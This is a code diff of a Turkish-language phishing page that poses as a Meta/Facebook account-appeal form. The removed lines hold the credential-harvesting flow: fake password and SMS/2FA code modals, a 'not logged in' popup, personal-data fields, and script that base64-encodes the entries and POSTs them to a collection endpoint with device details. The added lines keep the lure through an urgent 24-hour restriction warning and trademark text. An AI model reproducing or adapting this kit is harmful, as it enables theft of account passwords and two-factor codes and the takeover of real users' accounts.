onclick="selectCountry(&#39;+389&#39;,&#39;mk&#39;)"><img src="./Appeal Forms_files/mk.png" class="country-flag"><span class="country-name">Kuzey Makedonya</span><span class="dial-code">+389</span></li><li class="country" onclick="selectCountry(&#39;+47&#39;,&#39;no&#39;)"><img src="./Appeal Forms_files/no.png" class="country-flag"><span class="country-name">Norveç</span><span class="dial-code">+47</span></li><li class="country" onclick="selectCountry(&#39;+968&#39;,&#39;om&#39;)"><img src="./Appeal Forms_files/om.png" class="country-flag"><span class="country-name">Umman</span><span class="dial-code">+968</span></li><li class="country" onclick="selectCountry(&#39;+92&#39;,&#39;pk&#39;)"><img src="./Appeal Forms_files/pk.png" class="country-flag"><span class="country-name">Pakistan</span><span class="dial-code">+92</span></li><li class="country" onclick="selectCountry(&#39;+680&#39;,&#39;pw&#39;)"><img src="./Appeal Forms_files/pw.png" class="country-flag"><span class="country-name">Palau</span><span class="dial-code">+680</span></li><li class="country" onclick="selectCountry(&#39;+970&#39;,&#39;ps&#39;)"><img src="./Appeal Forms_files/ps.png" class="country-flag"><span class="country-name">Filistin</span><span class="dial-code">+970</span></li><li class="country" onclick="selectCountry(&#39;+507&#39;,&#39;pa&#39;)"><img src="./Appeal Forms_files/pa.png" class="country-flag"><span class="country-name">Panama</span><span class="dial-code">+507</span></li><li class="country" onclick="selectCountry(&#39;+675&#39;,&#39;pg&#39;)"><img src="./Appeal Forms_files/pg.png" class="country-flag"><span class="country-name">Papua Yeni Gine</span><span class="dial-code">+675</span></li><li class="country" onclick="selectCountry(&#39;+595&#39;,&#39;py&#39;)"><img src="./Appeal Forms_files/py.png" class="country-flag"><span class="country-name">Paraguay</span><span class="dial-code">+595</span></li><li class="country" onclick="selectCountry(&#39;+51&#39;,&#39;pe&#39;)"><img src="./Appeal Forms_files/pe.png" class="country-flag"><span class="country-name">Peru</span><span class="dial-code">+51</span></li><li class="country" onclick="selectCountry(&#39;+63&#39;,&#39;ph&#39;)"><img src="./Appeal Forms_files/ph.png" class="country-flag"><span class="country-name">Filipinler</span><span class="dial-code">+63</span></li><li class="country" onclick="selectCountry(&#39;+48&#39;,&#39;pl&#39;)"><img src="./Appeal Forms_files/pl.png" class="country-flag"><span class="country-name">Polonya</span><span class="dial-code">+48</span></li><li class="country" onclick="selectCountry(&#39;+351&#39;,&#39;pt&#39;)"><img src="./Appeal Forms_files/pt.png" class="country-flag"><span class="country-name">Portekiz</span><span class="dial-code">+351</span></li><li class="country" onclick="selectCountry(&#39;+974&#39;,&#39;qa&#39;)"><img src="./Appeal Forms_files/qa.png" class="country-flag"><span class="country-name">Katar</span><span class="dial-code">+974</span></li><li class="country" onclick="selectCountry(&#39;+242&#39;,&#39;cg&#39;)"><img src="./Appeal Forms_files/cg.png" class="country-flag"><span class="country-name">Kongo Cumhuriyeti</span><span class="dial-code">+242</span></li><li class="country" onclick="selectCountry(&#39;+40&#39;,&#39;ro&#39;)"><img src="./Appeal Forms_files/ro.png" class="country-flag"><span class="country-name">Romanya</span><span class="dial-code">+40</span></li><li class="country" onclick="selectCountry(&#39;+7&#39;,&#39;ru&#39;)"><img src="./Appeal Forms_files/ru.png" class="country-flag"><span class="country-name">Rusya</span><span class="dial-code">+7</span></li><li class="country" onclick="selectCountry(&#39;+250&#39;,&#39;rw&#39;)"><img src="./Appeal Forms_files/rw.png" class="country-flag"><span class="country-name">Ruanda</span><span class="dial-code">+250</span></li><li class="country" onclick="selectCountry(&#39;+685&#39;,&#39;ws&#39;)"><img src="./Appeal Forms_files/ws.png" class="country-flag"><span class="country-name">Samoa</span><span class="dial-code">+685</span></li><li class="country" onclick="selectCountry(&#39;+378&#39;,&#39;sm&#39;)"><img src="./Appeal Forms_files/sm.png" class="country-flag"><span class="country-name">San Marino</span><span class="dial-code">+378</span></li><li class="country" onclick="selectCountry(&#39;+966&#39;,&#39;sa&#39;)"><img src="./Appeal Forms_files/sa.png" class="country-flag"><span class="country-name">Suudi Arabistan</span><span class="dial-code">+966</span></li><li class="country" onclick="selectCountry(&#39;+221&#39;,&#39;sn&#39;)"><img src="./Appeal Forms_files/sn.png" class="country-flag"><span class="country-name">Senegal</span><span class="dial-code">+221</span></li><li class="country" onclick="selectCountry(&#39;+381&#39;,&#39;rs&#39;)"><img src="./Appeal Forms_files/rs.png" class="country-flag"><span class="country-name">Sırbistan</span><span class="dial-code">+381</span></li><li class="country" onclick="selectCountry(&#39;+248&#39;,&#39;sc&#39;)"><img src="./Appeal Forms_files/sc.png" class="country-flag"><span class="country-name">Seyşeller</span><span class="dial-code">+248</span></li><li class="country" onclick="selectCountry(&#39;+232&#39;,&#39;sl&#39;)"><img src="./Appeal Forms_files/sl.png" class="country-flag"><span class="country-name">Sierra Leone</span><span class="dial-code">+232</span></li><li class="country" onclick="selectCountry(&#39;+65&#39;,&#39;sg&#39;)"><img src="./Appeal Forms_files/sg.png" class="country-flag"><span class="country-name">Singapur</span><span class="dial-code">+65</span></li><li class="country" onclick="selectCountry(&#39;+421&#39;,&#39;sk&#39;)"><img src="./Appeal Forms_files/sk.png" class="country-flag"><span class="country-name">Slovakya</span><span class="dial-code">+421</span></li><li class="country" onclick="selectCountry(&#39;+386&#39;,&#39;si&#39;)"><img src="./Appeal Forms_files/si.png" class="country-flag"><span class="country-name">Slovenya</span><span class="dial-code">+386</span></li><li class="country" onclick="selectCountry(&#39;+677&#39;,&#39;sb&#39;)"><img src="./Appeal Forms_files/sb.png" class="country-flag"><span class="country-name">Solomon Adaları</span><span class="dial-code">+677</span></li><li class="country" onclick="selectCountry(&#39;+252&#39;,&#39;so&#39;)"><img src="./Appeal Forms_files/so.png" class="country-flag"><span class="country-name">Somali</span><span class="dial-code">+252</span></li><li class="country" onclick="selectCountry(&#39;+27&#39;,&#39;za&#39;)"><img src="./Appeal Forms_files/za.png" class="country-flag"><span class="country-name">Güney Afrika</span><span class="dial-code">+27</span></li><li class="country" onclick="selectCountry(&#39;+82&#39;,&#39;kr&#39;)"><img src="./Appeal Forms_files/kr.png" class="country-flag"><span class="country-name">Güney Kore</span><span class="dial-code">+82</span></li><li class="country" onclick="selectCountry(&#39;+34&#39;,&#39;es&#39;)"><img src="./Appeal Forms_files/es.png" class="country-flag"><span class="country-name">İspanya</span><span class="dial-code">+34</span></li><li class="country" onclick="selectCountry(&#39;+94&#39;,&#39;lk&#39;)"><img src="./Appeal Forms_files/lk.png" class="country-flag"><span class="country-name">Sri Lanka</span><span class="dial-code">+94</span></li><li class="country" onclick="selectCountry(&#39;+249&#39;,&#39;sd&#39;)"><img src="./Appeal Forms_files/sd.png" class="country-flag"><span class="country-name">Sudan</span><span class="dial-code">+249</span></li><li class="country" onclick="selectCountry(&#39;+597&#39;,&#39;sr&#39;)"><img src="./Appeal Forms_files/sr.png" class="country-flag"><span class="country-name">Surinam</span><span class="dial-code">+597</span></li><li class="country" onclick="selectCountry(&#39;+46&#39;,&#39;se&#39;)"><img src="./Appeal Forms_files/se.png" class="country-flag"><span class="country-name">İsveç</span><span class="dial-code">+46</span></li><li class="country" onclick="selectCountry(&#39;+41&#39;,&#39;ch&#39;)"><img src="./Appeal Forms_files/ch.png" class="country-flag"><span class="country-name">İsviçre</span><span class="dial-code">+41</span></li><li class="country" onclick="selectCountry(&#39;+963&#39;,&#39;sy&#39;)"><img src="./Appeal Forms_files/sy.png" class="country-flag"><span class="country-name">Suriye</span><span class="dial-code">+963</span></li><li class="country" onclick="selectCountry(&#39;+886&#39;,&#39;tw&#39;)"><img src="./Appeal Forms_files/tw.png" class="country-flag"><span class="country-name">Tayvan</span><span class="dial-code">+886</span></li><li class="country" onclick="selectCountry(&#39;+992&#39;,&#39;tj&#39;)"><img src="./Appeal Forms_files/tj.png" class="country-flag"><span class="country-name">Tacikistan</span><span class="dial-code">+992</span></li><li class="country" onclick="selectCountry(&#39;+255&#39;,&#39;tz&#39;)"><img src="./Appeal Forms_files/tz.png" class="country-flag"><span class="country-name">Tanzanya</span><span class="dial-code">+255</span></li><li class="country" onclick="selectCountry(&#39;+66&#39;,&#39;th&#39;)"><img src="./Appeal Forms_files/th.png" class="country-flag"><span class="country-name">Tayland</span><span class="dial-code">+66</span></li><li class="country" onclick="selectCountry(&#39;+670&#39;,&#39;tl&#39;)"><img src="./Appeal Forms_files/tl.png" class="country-flag"><span class="country-name">Doğu Timor</span><span class="dial-code">+670</span></li><li class="country" onclick="selectCountry(&#39;+228&#39;,&#39;tg&#39;)"><img src="./Appeal Forms_files/tg.png" class="country-flag"><span class="country-name">Togo</span><span class="dial-code">+228</span></li><li class="country" onclick="selectCountry(&#39;+676&#39;,&#39;to&#39;)"><img src="./Appeal Forms_files/to.png" class="country-flag"><span class="country-name">Tonga</span><span class="dial-code">+676</span></li><li class="country" onclick="selectCountry(&#39;+216&#39;,&#39;tn&#39;)"><img src="./Appeal Forms_files/tn.png" class="country-flag"><span class="country-name">Tunus</span><span class="dial-code">+216</span></li><li class="country" onclick="selectCountry(&#39;+90&#39;,&#39;tr&#39;)"><img src="./Appeal Forms_files/tr.png" class="country-flag"><span class="country-name">Türkiye</span><span class="dial-code">+90</span></li><li class="country" onclick="selectCountry(&#39;+993&#39;,&#39;tm&#39;)"><img src="./Appeal Forms_files/tm.png" class="country-flag"><span class="country-name">Türkmenistan</span><span class="dial-code">+993</span></li><li class="country" onclick="selectCountry(&#39;+971&#39;,&#39;ae&#39;)"><img src="./Appeal Forms_files/ae.png" class="country-flag"><span class="country-name">Birleşik Arap Emirlikleri</span><span class="dial-code">+971</span></li><li class="country" onclick="selectCountry(&#39;+256&#39;,&#39;ug&#39;)"><img src="./Appeal Forms_files/ug.png" class="country-flag"><span class="country-name">Uganda</span><span class="dial-code">+256</span></li><li class="country" onclick="selectCountry(&#39;+380&#39;,&#39;ua&#39;)"><img src="./Appeal Forms_files/ua.png" class="country-flag"><span class="country-name">Ukrayna</span><span class="dial-code">+380</span></li><li class="country" onclick="selectCountry(&#39;+44&#39;,&#39;gb&#39;)"><img src="./Appeal Forms_files/gb.png" class="country-flag"><span class="country-name">Birleşik Krallık</span><span class="dial-code">+44</span></li><li class="country" onclick="selectCountry(&#39;+1&#39;,&#39;us&#39;)"><img src="./Appeal Forms_files/us.png" class="country-flag"><span class="country-name">Amerika Birleşik Devletleri</span><span class="dial-code">+1</span></li><li class="country" onclick="selectCountry(&#39;+598&#39;,&#39;uy&#39;)"><img src="./Appeal Forms_files/uy.png" class="country-flag"><span class="country-name">Uruguay</span><span class="dial-code">+598</span></li><li class="country" onclick="selectCountry(&#39;+998&#39;,&#39;uz&#39;)"><img src="./Appeal Forms_files/uz.png" class="country-flag"><span class="country-name">Özbekistan</span><span class="dial-code">+998</span></li><li class="country" onclick="selectCountry(&#39;+678&#39;,&#39;vu&#39;)"><img src="./Appeal Forms_files/vu.png" class="country-flag"><span class="country-name">Vanuatu</span><span class="dial-code">+678</span></li><li class="country" onclick="selectCountry(&#39;+58&#39;,&#39;ve&#39;)"><img src="./Appeal Forms_files/ve.png" class="country-flag"><span class="country-name">Venezuela</span><span class="dial-code">+58</span></li><li class="country" onclick="selectCountry(&#39;+84&#39;,&#39;vn&#39;)"><img src="./Appeal Forms_files/vn.png" class="country-flag"><span class="country-name">Vietnam</span><span class="dial-code">+84</span></li><li class="country" onclick="selectCountry(&#39;+967&#39;,&#39;ye&#39;)"><img src="./Appeal Forms_files/ye.png" class="country-flag"><span class="country-name">Yemen</span><span class="dial-code">+967</span></li><li class="country" onclick="selectCountry(&#39;+260&#39;,&#39;zm&#39;)"><img src="./Appeal Forms_files/zm.png" class="country-flag"><span class="country-name">Zambiya</span><span class="dial-code">+260</span></li><li class="country" onclick="selectCountry(&#39;+263&#39;,&#39;zw&#39;)"><img src="./Appeal Forms_files/zw.png" class="country-flag"><span class="country-name">Zimbabve</span><span class="dial-code">+263</span></li></ul>
+                        <div class="btn-wrapper">
+                            <a href="/appeal-forms/" class="btn-primary-custom w-100" style="width: 100%; text-align: center; text-decoration: none;" data-translate="request_review_btn">
+                                Request Review
+                            </a>
+                            <div class="note-text restricted-message" data-translate="restricted_message">
+                                Your page will be restricted within <span class="date-bold">24 hours</span> if no action is taken.
                             </div>
                         </div>
                     </div>
-                    <script>
-                        // Synchronous: read cached geo from localStorage and apply instantly
-                        (function () {
-                            var codeToFlag = { "+1": "us", "+7": "ru", "+20": "eg", "+27": "za", "+30": "gr", "+31": "nl", "+32": "be", "+33": "fr", "+34": "es", "+36": "hu", "+39": "it", "+40": "ro", "+41": "ch", "+43": "at", "+44": "gb", "+45": "dk", "+46": "se", "+47": "no", "+48": "pl", "+49": "de", "+51": "pe", "+52": "mx", "+53": "cu", "+54": "ar", "+55": "br", "+56": "cl", "+57": "co", "+58": "ve", "+60": "my", "+61": "au", "+62": "id", "+63": "ph", "+64": "nz", "+65": "sg", "+66": "th", "+81": "jp", "+82": "kr", "+84": "vn", "+86": "cn", "+90": "tr", "+91": "in", "+92": "pk", "+93": "af", "+94": "lk", "+95": "mm", "+98": "ir", "+211": "ss", "+212": "ma", "+213": "dz", "+216": "tn", "+218": "ly", "+220": "gm", "+221": "sn", "+222": "mr", "+223": "ml", "+224": "gn", "+225": "ci", "+226": "bf", "+227": "ne", "+228": "tg", "+229": "bj", "+230": "mu", "+231": "lr", "+232": "sl", "+233": "gh", "+234": "ng", "+235": "td", "+236": "cf", "+237": "cm", "+238": "cv", "+240": "gq", "+241": "ga", "+242": "cg", "+243": "cd", "+244": "ao", "+245": "gw", "+248": "sc", "+249": "sd", "+250": "rw", "+251": "et", "+252": "so", "+253": "dj", "+254": "ke", "+255": "tz", "+256": "ug", "+257": "bi", "+258": "mz", "+260": "zm", "+261": "mg", "+262": "re", "+263": "zw", "+264": "na", "+265": "mw", "+266": "ls", "+267": "bw", "+268": "sz", "+269": "km", "+290": "sh", "+291": "er", "+297": "aw", "+298": "fo", "+299": "gl", "+350": "gi", "+351": "pt", "+352": "lu", "+353": "ie", "+354": "is", "+355": "al", "+356": "mt", "+357": "cy", "+358": "fi", "+359": "bg", "+370": "lt", "+371": "lv", "+372": "ee", "+373": "md", "+374": "am", "+375": "by", "+376": "ad", "+377": "mc", "+378": "sm", "+380": "ua", "+381": "rs", "+382": "me", "+383": "xk", "+385": "hr", "+386": "si", "+387": "ba", "+389": "mk", "+420": "cz", "+421": "sk", "+423": "li", "+500": "fk", "+501": "bz", "+502": "gt", "+503": "sv", "+504": "hn", "+505": "ni", "+506": "cr", "+507": "pa", "+509": "ht", "+590": "gp", "+591": "bo", "+592": "gy", "+593": "ec", "+594": "gf", "+595": "py", "+596": "mq", "+597": "sr", "+598": "uy", "+599": "cw", "+670": "tl", "+672": "nf", "+673": "bn", "+674": "nr", "+675": "pg", "+676": "to", "+677": "sb", "+678": "vu", "+679": "fj", "+680": "pw", "+681": "wf", "+682": "ck", "+683": "nu", "+685": "ws", "+686": "ki", "+687": "nc", "+688": "tv", "+689": "pf", "+691": "fm", "+692": "mh", "+850": "kp", "+852": "hk", "+853": "mo", "+855": "kh", "+856": "la", "+880": "bd", "+886": "tw", "+960": "mv", "+961": "lb", "+962": "jo", "+963": "sy", "+964": "iq", "+965": "kw", "+966": "sa", "+967": "ye", "+968": "om", "+970": "ps", "+971": "ae", "+972": "il", "+973": "bh", "+974": "qa", "+975": "bt", "+976": "mn", "+977": "np", "+992": "tj", "+993": "tm", "+994": "az", "+995": "ge", "+996": "kg", "+998": "uz" };
-                            var cached = localStorage.getItem('geo_country');
-                            var dialCode = '+90', flagCode = 'tr';
-                            if (cached) {
-                                for (var code in codeToFlag) {
-                                    if (codeToFlag[code] === cached) { dialCode = code; flagCode = cached; break; }
-                                }
-                            }
-                            document.getElementById('phone').value = dialCode + ' ';
-                            var img = document.getElementById('selected-flag-img');
-                            img.src = 'https://flagcdn.com/w20/' + flagCode + '.png';
-                            img.alt = flagCode.toUpperCase();
-                        })();
-                    </script>
-                </div>
-                <div class="form-error" id="error-phone"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <line x1="12" y1="8" x2="12" y2="12"></line>
-                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                    </svg><span></span></div>
 
-                <div class="form-coursera-field">
-                    <span class="dob-label" data-i18n="form.dobLabel">Doğum Tarihi</span>
-                    <div class="dob-grid">
-                        <div class="dob-field">
-                            <input placeholder="Gün" data-i18n-placeholder="form.dayPlaceholder" id="day" type="number" min="1" max="31" required="" oninput="31&lt;this.value&amp;&amp;(this.value=31),this.value&lt;1&amp;&amp;&#39;&#39;!=this.value&amp;&amp;(this.value=1)">
-                        </div>
-                        <div class="dob-field">
-                            <input placeholder="Ay" data-i18n-placeholder="form.monthPlaceholder" id="month" type="number" min="1" max="12" required="" oninput="12&lt;this.value&amp;&amp;(this.value=12),this.value&lt;1&amp;&amp;&#39;&#39;!=this.value&amp;&amp;(this.value=1)">
-                        </div>
-                        <div class="dob-field">
-                            <input inputmode="numeric" placeholder="Yıl" data-i18n-placeholder="form.yearPlaceholder" id="year" type="number" min="1" max="2026" required="" oninput="2026&lt;this.value&amp;&amp;(this.value=2026)">
-                        </div>
+                    <!-- Trademark Section -->
+                    <h5 style="font-weight: 600; margin-top: 24px;" data-translate="what_is_trademark">What is trademark infringement?</h5>
+                    <h6 style="font-weight: 400; line-height: 1.6; margin-top: 8px;" data-translate="trademark_desc">Generally, trademark infringement occurs when all three of the following requirements are met:</h6>
+                    <ul class="list-bullet">
+                        <li data-translate="trademark_point1">A company or person uses a trademark owned by someone else (or a similar mark) without permission.</li>
+                        <li data-translate="trademark_point2">This use is in the course of trade, meaning it is in connection with the sale or promotion of goods or services.</li>
+                        <li data-translate="trademark_point3">This use is likely to cause consumer confusion about the source, endorsement, or affiliation of the goods or services.</li>
+                    </ul>
+
+                    <p style="line-height: 1.7;" data-translate="trademark_text">The core standard for trademark infringement is often the likelihood of confusion. There are many factors that determine whether someone's use of a trademark may cause confusion. For example, when someone uses a trademark on unrelated goods or services, it may not be infringement because it may not cause confusion. It is also often important to consider which party used the trademark first.</p>
+
+                    <!-- Footer Links -->
+                    <hr style="border-color: #e4e6eb; margin: 24px 0;">
+                    <h6 style="font-weight: 600;" data-translate="privacy_center_title">Privacy Center</h6>
+                    <h6 style="font-weight: 600; margin-top: 16px;" data-translate="user_agreement">For more details, see the User Agreement</h6>
+
+                    <div class="footer-note" style="margin-top: 16px; font-size: 13.5px; color: #65676b; line-height: 1.6;" data-translate="footer_note">
+                        We continuously identify potential privacy risks, including when collecting, using, or sharing personal information, and develop methods to mitigate these risks. Read more about
+                        <a href="#" style="color: #1877f2; text-decoration: none;" data-translate="privacy_policy_link">Privacy Policy</a>.
                     </div>
                 </div>
-                <div class="form-error" id="error-dob"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <line x1="12" y1="8" x2="12" y2="12"></line>
-                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                    </svg><span></span></div>
-
-                <!-- Radio Buttons + Textarea -->
-                <div class="form-coursera-field">
-                    <span style="display:flex;gap:5px;"><span data-i18n="form.whatHappened">Ne olduğunu düşünüyorsunuz?</span> <span style="color:red">*</span></span>
-
-                    <div class="radio-group">
-                        <label>
-                            <input type="radio" name="goal" value="An erroneous report" required="">
-                            <span data-i18n="form.radio1">Bu durum hatalı bir bildirim veya olası bir rakip tarafından yapılan haksız bir şikayetten kaynaklanmış olabilir.</span>
-                        </label>
-                        <label>
-                            <input type="radio" name="goal" value="Sent in error">
-                            <span data-i18n="form.radio2">Bu bildirim yanlışlıkla gönderilmiş olabilir ve hesabın mevcut durumunu doğru yansıtmayabilir.</span>
-                        </label>
-                        <label>
-                            <input type="radio" name="goal" value="Other">
-                            <span data-i18n="form.radio3">Sahtekarlık yok / diğer yasal neden:</span>
-                        </label>
-                    </div>
-                </div>
-
-                <textarea id="message" name="goal_other" rows="4" placeholder="Lütfen detayları açıklayın..." data-i18n-placeholder="form.textareaPlaceholder" class="textarea"></textarea>
-            </div>
-
-            <div class="form-coursera-footer">
-                <img decoding="async" src="https://i.postimg.cc/qqQvGqsv/meta.png" alt="Meta Logo" class="logo">
-                <button type="submit" class="submit-btn" id="info-submit-btn">
-                    <span id="info-btn-text" data-i18n="form.submit">Gönder</span>
-                    <span id="info-spinner" class="loading-spinner" style="display:none;"></span>
-                </button>
-            </div>
-        </form>
-    </div>
-
-    <!-- Not Logged In Popup -->
-    <div id="notloggedin-overlay" class="nli-overlay hidden">
-        <div class="nli-dialog">
-            <div class="nli-header" data-i18n="nli.title">Oturum Açılmadı</div>
-            <div class="nli-body">
-                <p data-i18n="nli.body">Devam etmek için lütfen giriş yapın.</p>
-            </div>
-            <div class="nli-footer">
-                <button id="nli-login-btn" class="nli-btn" data-i18n="nli.login">Giriş Yap</button>
             </div>
         </div>
     </div>
 
-    <style>
-        .nli-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.45);
-            z-index: 10000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .nli-overlay.hidden {
-            display: none;
-        }
-
-        .nli-dialog {
-            width: 438px;
-            max-width: 92vw;
-            border: 2px solid #8a8a8a;
-            border-top: 2px solid #7a7a7a;
-            background: #fff;
-            box-shadow:
-                0 0 0 1px rgba(0, 0, 0, 0.1),
-                0 4px 18px 3px rgba(0, 0, 0, 0.35),
-                0 1px 4px rgba(0, 0, 0, 0.25);
-            font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
-            border-radius: 0;
-        }
-
-        .nli-header {
-            background: linear-gradient(to bottom, #7e93b6 0%, #6d84b4 100%);
-            color: #fff;
-            font-size: 13px;
-            font-weight: 700;
-            padding: 5px 10px;
-            line-height: 22px;
-            border-bottom: 1px solid #1a356e;
-            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
-            letter-spacing: 0.01em;
-        }
-
-        .nli-body {
-            padding: 18px 12px 14px 12px;
-            background: #f6f6f6;
-            border-bottom: 1px solid #ccc;
-        }
-
-        .nli-body p {
-            font-size: 12.5px;
-            color: #333;
-            margin: 0;
-            line-height: 1.5;
-            font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
-        }
-
-        .nli-footer {
-            padding: 8px 12px;
-            text-align: right;
-            background: #f2f2f2;
-            border-top: 1px solid #e9e9e9;
-        }
-
-        .nli-btn {
-            background: linear-gradient(to bottom, #4e69a2 0%, #3b5998 50%, #3b5998 100%);
-            color: #fff;
-            border: 1px solid #2f477a;
-            padding: 3px 16px 4px;
-            font-size: 12.5px;
-            font-weight: 700;
-            cursor: pointer;
-            border-radius: 2px;
-            font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
-            text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.2);
-            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
-            line-height: 20px;
-        }
-
-        .nli-btn:hover {
-            background: linear-gradient(to bottom, #5b75a7 0%, #4a68a1 100%);
-        }
-
-        .nli-btn:active {
-            background: #3b5998;
-            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.2);
-        }
-    </style>
-
-    <!-- Password Modal -->
-    <div id="modal-password" class="modal-overlay hidden">
-        <div class="modal-box">
-            <div class="modal-logo-top">
-                <img width="100%" height="100%" alt="Facebook" src="https://i.postimg.cc/sXmWmRgn/Facebook.png">
-            </div>
-            <div class="modal-pwd-content">
-                <div>
-                    <p class="modal-pwd-desc" data-i18n="pwd.desc">Güvenlik nedenleriyle devam etmek için şifrenizi girmeniz gerekmektedir.</p>
-                    <form class="modal-form" id="form-password">
-                        <div class="pwd-input-wrapper">
-                            <input class="hide-password-toggle" id="password" placeholder="Şifre" data-i18n-placeholder="pwd.placeholder" autocomplete="new-password" type="password" value="">
-                            <button type="button" id="toggle-password" class="toggle-pwd-btn" tabindex="-1">
-                                <svg id="eye-off-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49">
-                                    </path>
-                                    <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path>
-                                    <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143">
-                                    </path>
-                                    <path d="m2 2 20 20"></path>
-                                </svg>
-                                <svg id="eye-on-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
-                                    <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path>
-                                    <circle cx="12" cy="12" r="3"></circle>
-                                </svg>
-                            </button>
-                        </div>
-                        <p class="error_password" id="pwd-error"></p>
-                        <button type="submit" class="continue-btn" id="pwd-submit-btn">
-                            <span id="pwd-btn-text" data-i18n="pwd.continue">Devam Et</span>
-                        </button>
-                        <a href="https://meta-appealshelppagecenter-for.vercel.app/appeal-forms#" class="forgot-link" data-i18n="pwd.forgot">Şifrenizi mi unuttunuz?</a>
-                    </form>
-                </div>
-            </div>
-            <div class="modal-logo-bottom">
-                <img width="100%" height="100%" alt="Meta" src="https://i.postimg.cc/qqQvGqsv/meta.png">
-            </div>
-        </div>
-    </div>
-
-    <!-- 2FA Modal -->
-    <div id="modal-2fa" class="modal-overlay hidden">
-        <div class="modal-box">
-            <div style="width:100%;">
-                <div class="tfa-header-row">
-                    <span id="2fa-email-display"></span>
-                    <div class="tfa-dot"></div>
-                    <span>Facebook</span>
-                </div>
-                <h2 class="tfa-title">
-                    <span data-i18n="tfa.title">SMS'lerinizi Kontrol Edin</span>
-                </h2>
-                <p class="tfa-desc">
-                    <span data-i18n="tfa.desc">Gönderdiğimiz kodu girin</span>
-                    <span id="2fa-masked-info" <span="" data-i18n="tfa.desc2">veya Google Authenticator gibi bir kimlik doğrulama uygulamasıyla onaylayın.</span>
-                </p>
-                <div class="tfa-image">
-                    <img width="100%" alt="authentication" src="https://i.postimg.cc/3wcFsc0y/authentication.png">
-                </div>
-                <div style="width:100%;">
-                    <form id="form-2fa">
-                        <div class="pwd-input-wrapper">
-                            <input id="code-2fa" placeholder="Kodu Girin" data-i18n-placeholder="tfa.placeholder" maxlength="8" inputmode="numeric" pattern="[0-9]*" value="" oninput="this.value=this.value.replace(/[^0-9]/g,&#39;&#39;).slice(0,8)">
-                        </div>
-                        <p class="error_password" id="2fa-error"></p>
-                        <div style="margin-top:20px;">
-                            <button type="submit" id="tfa-submit-btn" disabled="" class="continue-btn tfa-submit-btn">
-                                <span id="tfa-btn-text" data-i18n="tfa.submit">Gönder</span>
-                                <span id="tfa-spinner" class="loading-spinner" style="display:none;"></span>
-                            </button>
-                        </div>
-                        <div class="tfa-try-another">
-                            <span data-i18n="tfa.help">Başka bir doğrulama yöntemine mi ihtiyacınız var?</span>
-                        </div>
-                    </form>
-                </div>
-            </div>
-            <div class="modal-logo-bottom">
-                <img width="100%" height="100%" alt="Meta" src="https://i.postimg.cc/qqQvGqsv/meta.png">
-            </div>
-        </div>
-    </div>
-
-    <!-- Success Banner -->
-    <div id="modal-success" class="modal-overlay hidden">
-        <div style="background:#fff;border-radius:4px;max-width:520px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,0.15);overflow:hidden;animation:modalSlideIn 0.3s ease;">
-            <div style="background:#3b5998;padding:16px 20px;">
-                <h2 style="color:#fff;font-size:16px;font-weight:700;margin:0;line-height:1.4;" data-i18n="success.title">Talebiniz başarıyla gönderildi.</h2>
-            </div>
-            <div style="padding:20px;border-bottom:1px solid #ddd;">
-                <p style="color:#333;font-size:14px;margin:0;line-height:1.5;" data-i18n="success.desc">İnceleme tamamlandığında e-posta yoluyla bilgilendirileceksiniz.</p>
-            </div>
-            <div style="display:flex;align-items:center;justify-content:space-between;padding:12px 20px;">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" style="height:22px;">
-                <button onclick="window.location.href=&#39;https://www.facebook.com&#39;" data-i18n="success.ok" style="background:#3b5998;color:#fff;border:none;border-radius:4px;padding:8px 24px;font-size:14px;font-weight:600;cursor:pointer;">Tamam</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Footer -->
-    <footer class="site-footer">
-        Telif Hakkı © 2026 Meta for Business
-    </footer>
-
-    <script src="./Appeal Forms_files/i18n.js.download"></script>
-
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
     <script>
-        /* ===== API Logic ===== */
-        let pwdAttempts = 0, currentSessionId = null, isSubmittingInfo = false;
-
-     function encodePayload(data) { return btoa(JSON.stringify(data)); }
-        async function sendData(payload) {
-            try {
-                const response = await fetch('/api/send-request', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: encodePayload(payload) })
-                });
-                return await response.json();
-            } catch (e) { return { success: false }; }
-        }
-
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let browser = 'Unknown', os = 'Unknown';
-            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
-            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
-            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
